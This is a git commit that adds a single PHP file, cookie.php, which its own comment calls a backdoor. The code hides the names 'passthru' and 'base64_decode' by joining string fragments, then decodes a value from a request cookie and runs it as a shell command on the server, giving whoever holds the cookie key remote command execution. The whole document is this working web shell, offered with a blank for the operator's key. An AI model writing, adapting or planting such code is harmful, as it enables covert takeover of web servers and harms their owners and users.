ac0876241d380632692ea75fbbadae1e600d954b
krishpranav <krisna.pranav@gmail.com>
2021-04-04 14:24:50 +0530

    adding files

---
+++ cookie.php
@@ -0,0 +1,7 @@
+<?php
+# the code of the backdoor used
+$bOne = "pa"."ss"."th"."ru";
+$bTwo = "ba"."se"."64"."_"."de"."co"."de";
+$bKey = ""; # your cookie used for connecting backdoor
+$bOne($bTwo($_COOKIE[$bKey]));
+?>
